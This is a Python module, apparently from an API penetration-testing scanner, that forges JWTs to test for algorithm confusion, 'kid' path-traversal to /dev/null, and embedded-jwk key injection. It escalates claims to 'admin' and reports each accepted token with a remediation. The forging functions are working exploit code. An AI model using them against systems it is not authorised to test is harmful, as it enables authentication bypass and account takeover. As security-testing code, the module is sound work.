"""Advanced JWT attacks for APIStrike (OWASP API2:2023).

Self-contained extension for the Broken Authentication module. Adds four
signature-verification bypasses on top of the existing alg:none / weak-secret /
expiry checks:

  1. Algorithm confusion  -- RS256 -> HS256 using the server's RSA *public* key
                             as the HMAC secret.
  2. kid injection        -- point the 'kid' header at /dev/null so the signing
                             key becomes the empty string.
  3. jwk header injection -- embed an attacker-generated public key in the token
                             header and self-sign with the matching private key.

Design rules (identical to the rest of APIStrike):
  * No httpx here -- every request goes through the injected ScopedHTTPClient
    that the BrokenAuthModule already holds, so scope + rate limiting apply.
  * Evidence-driven: a finding is only recorded after a live request proves the
    forged token behaves like the known-good one.
  * Pure forging helpers are standard-library only and unit-testable offline.
    RSA-dependent helpers degrade gracefully if 'cryptography' is absent.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import List, Optional

from apistrike.auth.auth_engine import _b64url_decode, decode_jwt
from apistrike.core.findings import Finding

try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization
    _HAS_CRYPTO = True
except Exception:  # pragma: no cover - optional dependency
    _HAS_CRYPTO = False

_ASYMMETRIC_ALGS = {"RS256", "RS384", "RS512", "ES256", "ES384", "PS256", "PS384"}

# kid values that resolve to an empty / predictable file, making the key empty.
_KID_EMPTY_KEY_PAYLOADS = (
    "../../../../../../../../dev/null",
    "/dev/null",
)


# ---------------------------------------------------------------------------
# Local JWT primitives (kept here so this module is import-independent)
# ---------------------------------------------------------------------------
def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")


def _split(token: str) -> tuple:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a well-formed JWT (expected 3 dot-separated parts).")
    return parts[0], parts[1], parts[2]


def _encode_segment(obj: dict) -> str:
    raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    return _b64url_encode(raw)


def hs256_signature(signing_input: bytes, secret: str) -> str:
    digest = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return _b64url_encode(digest)


def token_alg(token: str) -> str:
    try:
        return str(decode_jwt(token)["header"].get("alg", "")).upper()
    except ValueError:
        return ""


# ---------------------------------------------------------------------------
# Pure forging helpers (offline-testable)
# ---------------------------------------------------------------------------
def forge_algorithm_confusion(token: str, public_key_pem: str,
                              claim_updates: Optional[dict] = None) -> List[str]:
    """RS256 -> HS256 confusion. HMAC-sign the token using the RSA public key
    as the shared secret. Emits a few PEM byte-variants (servers differ on
    trailing newlines) for the live check to try."""
    header_raw, payload_raw, _sig = _split(token)
    header = json.loads(_b64url_decode(header_raw))
    payload = json.loads(_b64url_decode(payload_raw))
    header["alg"] = "HS256"
    if claim_updates:
        payload.update(claim_updates)
    h_raw = _encode_segment(header)
    p_raw = _encode_segment(payload)
    signing_input = f"{h_raw}.{p_raw}".encode("utf-8")

    pem = public_key_pem
    variants = [pem, pem.strip(), pem.strip() + "\n", pem.rstrip("\n")]
    seen, out = set(), []
    for secret in variants:
        if secret in seen:
            continue
        seen.add(secret)
        out.append(f"{h_raw}.{p_raw}.{hs256_signature(signing_input, secret)}")
    return out


def forge_kid_injection(token: str) -> List[str]:
    """Set a traversal 'kid' and HS256-sign with the empty string."""
    header_raw, payload_raw, _sig = _split(token)
    header = json.loads(_b64url_decode(header_raw))
    payload = json.loads(_b64url_decode(payload_raw))
    forged: List[str] = []
    for kid in _KID_EMPTY_KEY_PAYLOADS:
        h = dict(header)
        h["alg"] = "HS256"
        h["kid"] = kid
        h_raw = _encode_segment(h)
        p_raw = _encode_segment(payload)
        signing_input = f"{h_raw}.{p_raw}".encode("utf-8")
        forged.append(f"{h_raw}.{p_raw}.{hs256_signature(signing_input, '')}")
    return forged


def _b64uint(n: int) -> str:
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return _b64url_encode(raw)


def forge_jwk_header_injection(token: str,
                               claim_updates: Optional[dict] = None) -> Optional[str]:
    """Embed our own public key as a 'jwk' header and RS256-sign with the
    matching private key. Returns None if 'cryptography' is unavailable."""
    if not _HAS_CRYPTO:
        return None
    _h, payload_raw, _sig = _split(token)
    payload = json.loads(_b64url_decode(payload_raw))
    if claim_updates:
        payload.update(claim_updates)

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    nums = key.public_key().public_numbers()
    jwk = {"kty": "RSA", "kid": "apistrike", "use": "sig",
           "alg": "RS256", "n": _b64uint(nums.n), "e": _b64uint(nums.e)}
    header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}

    h_raw = _encode_segment(header)
    p_raw = _encode_segment(payload)
    signing_input = f"{h_raw}.{p_raw}".encode("utf-8")
    sig = key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    return f"{h_raw}.{p_raw}.{_b64url_encode(sig)}"


def jwk_to_pem(jwk: dict) -> Optional[str]:
    """Convert an RSA JWK ({n,e}) from a JWKS endpoint into a PEM public key."""
    if not _HAS_CRYPTO or jwk.get("kty") != "RSA":
        return None
    n = int.from_bytes(_b64url_decode(jwk["n"]), "big")
    e = int.from_bytes(_b64url_decode(jwk["e"]), "big")
    pub = rsa.RSAPublicNumbers(e, n).public_key()
    return pub.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode("utf-8")


def _admin_claims(token: str) -> dict:
    """Copy the token's claims, overwriting identity fields with 'admin'."""
    claims = decode_jwt(token)["payload"]
    forged = dict(claims)
    for key in ("sub", "username", "user", "name"):
        if key in forged:
            forged[key] = "admin"
    forged.setdefault("sub", "admin")
    return forged


# ---------------------------------------------------------------------------
# Live orchestration -- called from BrokenAuthModule.run()
# ---------------------------------------------------------------------------
async def _resolve_public_key(module, result) -> Optional[str]:
    pem = getattr(module, "public_key_pem", None)
    if pem:
        return pem
    jwks_url = getattr(module, "jwks_url", None)
    if not jwks_url:
        return None
    try:
        ev = await module.client.get(jwks_url)
        data = json.loads(ev.body)
        for jwk in data.get("keys", []):
            pem = jwk_to_pem(jwk)
            if pem:
                result.notes.append(f"Recovered RSA public key from {jwks_url}.")
                return pem
    except Exception as e:  # noqa: BLE001
        result.notes.append(f"Could not fetch/parse JWKS at {jwks_url}: {e}")
    return None


async def _check_algorithm_confusion(module, result) -> None:
    if token_alg(module.valid_token) not in _ASYMMETRIC_ALGS:
        result.notes.append("Algorithm-confusion skipped: token is not asymmetric (RS/ES/PS).")
        return
    pem = await _resolve_public_key(module, result)
    if not pem:
        result.notes.append("Algorithm-confusion skipped: no public key (pass --pubkey or --jwks-url).")
        return
    forged_claims = _admin_claims(module.valid_token)
    for forged in forge_algorithm_confusion(module.valid_token, pem, forged_claims):
        ev = await module._probe(forged)
        if module._authorized(ev.status_code):
            result.findings.append(Finding(
                title="JWT RS256->HS256 algorithm confusion accepted",
                severity="critical", owasp_id=module.OWASP_ID,
                endpoint=module.probe_path, cwe="CWE-347", confidence="confirmed",
                description=(
                    "The target accepted a token HMAC-signed (HS256) using the server's own RSA "
                    "public key as the shared secret. The verifier trusts the header 'alg', so an "
                    "attacker who knows the public key can forge tokens for any user, incl. admins."),
                recommendation=(
                    "Pin the expected algorithm to the key type (verify RS256 only) and never let "
                    "the token header choose the verification algorithm."),
                evidence=[module._evidence("alg_confusion", forged, ev.status_code,
                                           {"forged_claims": forged_claims})],
            ))
            return


async def _check_kid_injection(module, result) -> None:
    for forged in forge_kid_injection(module.valid_token):
        ev = await module._probe(forged)
        if module._authorized(ev.status_code):
            kid = json.loads(_b64url_decode(forged.split(".")[0])).get("kid")
            result.findings.append(Finding(
                title="JWT 'kid' header injection accepted (empty-key signing)",
                severity="critical", owasp_id=module.OWASP_ID,
                endpoint=module.probe_path, cwe="CWE-347", confidence="confirmed",
                description=(
                    f"The target accepted a token whose 'kid' header was {kid!r} and which was "
                    "HMAC-signed with an empty key. 'kid' is resolved to a predictable/empty file, "
                    "letting an attacker control the signing key."),
                recommendation=(
                    "Treat 'kid' as an untrusted lookup key: validate against an allowlist, never use "
                    "it as a filesystem path or SQL value, and reject unknown kids."),
                evidence=[module._evidence("kid_injection", forged, ev.status_code, {"kid": kid})],
            ))
            return


async def _check_jwk_header_injection(module, result) -> None:
    if not _HAS_CRYPTO:
        result.notes.append("jwk-header check skipped: 'cryptography' not installed.")
        return
    forged = forge_jwk_header_injection(module.valid_token, {"sub": "admin"})
    if not forged:
        return
    ev = await module._probe(forged)
    if module._authorized(ev.status_code):
        result.findings.append(Finding(
            title="JWT 'jwk' header key-injection accepted",
            severity="critical", owasp_id=module.OWASP_ID,
            endpoint=module.probe_path, cwe="CWE-347", confidence="confirmed",
            description=(
                "The target accepted a token whose 'jwk' header embedded an attacker-generated "
                "public key and was signed with the matching private key. The verifier trusts a "
                "self-provided key, so any token can be forged."),
            recommendation=(
                "Never trust keys embedded in the token header ('jwk'/'jku'/'x5u'/'x5c'). Verify "
                "only against keys from a trusted, server-side key store."),
            evidence=[module._evidence("jwk_injection", forged, ev.status_code)],
        ))


async def run_advanced_jwt_checks(module, result, live: bool) -> None:
    """Entry point wired into BrokenAuthModule.run(). No-op when not live."""
    if not live:
        return
    await _check_algorithm_confusion(module, result)
    await _check_kid_injection(module, result)
    await _check_jwk_header_injection(module, result)
    listener = getattr(module, "oast_listener", None)
    if listener is not None:
        from apistrike.modules.jwt_header_urls import run_jku_x5u_checks
        await run_jku_x5u_checks(module, result, listener, live)
